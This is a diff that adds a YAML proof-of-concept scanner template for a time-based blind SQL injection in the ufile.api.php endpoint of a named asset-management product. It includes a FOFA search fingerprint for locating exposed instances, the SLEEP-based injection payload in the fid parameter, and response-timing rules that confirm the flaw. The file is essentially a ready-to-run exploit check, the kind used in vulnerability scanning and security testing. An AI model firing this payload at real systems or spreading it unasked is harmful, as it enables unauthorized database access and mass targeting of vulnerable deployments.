@@ -1,0 +1,19 @@
+id: poc-yaml-baiyishequ-ufile-api-php-sqli
+info:
+  name: 百易云资产管理运营系统 ufile.api.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 百易云资产管理运营系统
+  fofa: body="不要着急，点此"
+variables:
+  t1: random_int(1,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP({{.t1}})))UPCw)
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\":\") &&\ncontains(body,\"\
+    \\\"req_id\\\":\") &&\ncontains(headers,\"X-Powered-By: baiyiyun\") &&\nduration\
+    \ > t2 &&\nduration < t3\n"
+transport: http
